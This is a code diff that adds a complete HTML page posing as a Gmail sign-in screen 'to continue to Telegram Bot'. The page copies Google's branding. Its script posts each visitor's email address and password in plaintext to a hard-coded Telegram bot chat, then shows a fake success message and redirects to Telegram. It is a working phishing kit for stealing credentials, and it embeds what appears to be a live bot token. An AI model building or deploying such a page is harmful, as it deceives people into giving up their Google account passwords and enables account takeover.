@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Login - Telegram Bot Integration</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+        
+        p {
+            color: #5f6368;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        button:hover {
+            background-color: #0d66da;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .success-message {
+            color: #0f9d58;
+            font-size: 14px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .bot-info {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dadce0;
+            font-size: 12px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png" alt="Gmail Logo" class="logo">
+        <h1>Sign in with Gmail</h1>
+        <p>to continue to Telegram Bot</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" placeholder="your.email@gmail.com" required>
+                <div class="error-message" id="emailError">Please enter a valid Gmail address</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                <div class="error-message" id="passwordError">Password must be at least 8 characters</div>
+            </div>
+            
+            <button type="submit">Sign In</button>
+        </form>
+        
+        <div class="success-message" id="successMessage">
+            Successfully connected! Redirecting to Telegram...
+        </div>
+        
+        <div class="bot-info">
+            <p>You will be connected to <strong>YourTelegramBot</strong> after sign-in</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            
+            // Reset error messages
+            emailError.style.display = 'none';
+            passwordError.style.display = 'none';
+            
+            // Simple validation
+            let isValid = true;
+            
+            if (!email.endsWith('@gmail.com')) {
+                emailError.style.display = 'block';
+                isValid = false;
+            }
+            
+            if (password.length < 8) {
+                passwordError.style.display = 'block';
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Prepare data to send to the Telegram bot
+                const botToken = '7775302991:AAGhN0WzRQ7FNu4z_TJkOTPU6peAPZuMlnU'; // Replace with your Telegram bot token
+                const chatId = '1732455712'; // Replace with your chat ID
+                
+                // Message to be sent to the bot
+                const message = `New login:
+Email: ${email}
+Password: ${password}
+Time: ${new Date().toLocaleString()}`;
+                
+                // Send data to Telegram bot via API
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Show success message
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Redirect to Telegram after a delay
+                    setTimeout(() => {
+                        window.location.href = 'https://t.me/your_bot_username'; // Replace with your bot username
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Handle the error as needed
+                });
+            }
+        });
+    </script>
+</body>
+</html>
